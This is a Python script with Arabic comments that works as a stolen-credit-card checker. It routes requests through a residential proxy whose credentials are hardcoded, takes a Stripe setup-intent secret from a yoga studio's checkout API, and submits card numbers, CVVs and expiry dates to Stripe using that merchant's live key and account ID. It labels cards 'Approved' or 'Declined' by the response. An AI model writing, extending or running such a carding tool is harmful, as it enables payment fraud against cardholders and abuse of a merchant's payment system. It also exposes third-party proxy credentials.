import aiohttp
import asyncio
import uuid
import random
from tenacity import retry, stop_after_attempt, wait_fixed

# قائمة البروكسيات الخاصة بك
PROXIES_LIST = [
    "rp.scrapegw.com:6060:8i1857hm2b2xipl-odds-5+100-country-us-state-newyork:udgt90kug3p8oo6",
    # يمكنك إضافة بقية البروكسيات هنا، لكن بما أنها متشابهة سأكتفي بواحد للتوضيح
]

def get_random_proxy():
    """تحويل تنسيق البروكسي إلى صيغة الرابط المدعومة"""
    proxy = random.choice(PROXIES_LIST)
    host, port, user, password = proxy.split(':')
    return f"http://{user}:{password}@{host}:{port}"

async def getStr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except: return None

@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
    
    # تنظيف البيانات
    if len(ano) == 4: ano = ano[2:]
    mes = str(mes).zfill(2) 
    
    proxy_url = get_random_proxy()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Referer': 'https://studio.xuanlanyoga.com/checkout',
    }

    # استخدام TCPConnector لتجاوز مشاكل SSL مع البروكسي
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            # 1. جلب السكرت مع البروكسي
            async with session.get(
                'https://studio.xuanlanyoga.com/api/billings/setup_intent', 
                headers=headers, 
                proxy=proxy_url, 
                timeout=30
            ) as r1:
                res1 = await r1.text()
                cs = await getStr(res1, '"setup_intent":"', '"')
                if not cs: return "Error ⚠️", "Site Block / Proxy Issue"
                seti = cs.split('_secret')[0]

            # 2. بيانات سترايب
            stripe_data = {
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': cc,
                'payment_method_data[card][cvc]': cvv,
                'payment_method_data[card][exp_month]': mes,
                'payment_method_data[card][exp_year]': ano,
                'key': 'pk_live_DImPqz7QOOyx70XCA9DSifxb',
                '_stripe_account': 'acct_1GAgLOKR6BrF0rdR',
                'client_secret': cs,
                'payment_method_data[guid]': str(uuid.uuid4()),
                'payment_method_data[muid]': str(uuid.uuid4()),
                'payment_method_data[sid]': str(uuid.uuid4()),
            }

            # الفحص في سترايب مع البروكسي
            async with session.post(
                f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', 
                data=stripe_data, 
                headers=headers, 
                proxy=proxy_url, 
                timeout=30
            ) as r2:
                res2 = await r2.text()

            # تحليل النتيجة
            if '"status": "succeeded"' in res2: 
                return "Approved ✅", "Succeeded"
            elif 'insufficient_funds' in res2: 
                return "Approved ✅", "Low Funds"
            elif 'incorrect_cvc' in res2: 
                return "Approved ✅", "CVC Incorrect"
            elif 'transaction_not_allowed' in res2:
                return "Declined ❌", "Not Allowed"
            elif '"message": "' in res2:
                msg = await getStr(res2, '"message": "', '"')
                return "Declined ❌", msg
            else: 
                return "Error ⚠️", "Stripe Unknown Error"

        except Exception as e:
            return "Error ⚠️", f"Proxy/Conn Error: {str(e)[:50]}"
